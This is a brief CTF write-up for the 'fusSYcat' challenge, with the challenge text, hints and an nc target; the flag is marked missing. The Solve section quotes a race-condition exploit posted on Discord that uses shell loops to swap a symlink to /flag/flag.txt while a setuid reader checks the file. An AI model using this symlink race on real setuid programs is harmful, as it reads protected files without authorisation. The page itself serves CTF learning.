# fusSYcat

## Descrption
Can you cat flag.txt?
fusSycat might help you... if you can outsmart it.
Be quick!

```bash
nc fussycat.ctf.fifthdoma.in 13376
```

### Hints
<details>
<summary>Hint 1</summary>
What file types does fussycat accept?
</details>
<details>
<summary>Hint 2</summary>
Timing is important for this challenge.
</details>
<details>
<summary>Hint 3</summary>
flag is in flag/flag.txt.
</details>

## Solve 
<strong>I have not completed this flag as the fussycat binary was modified and therefore lost the sticky user bit</strong>

```bash
# answer provided on discord by Oshawk
while true; do touch flag.txt; rm flag.txt; ln -s /flag/flag.txt flag.txt; rm flag.txt; done &
while true; do fussycat flag.txt 2>/dev/null | grep {; done
```

## Flag
<strong>missing...</strong>

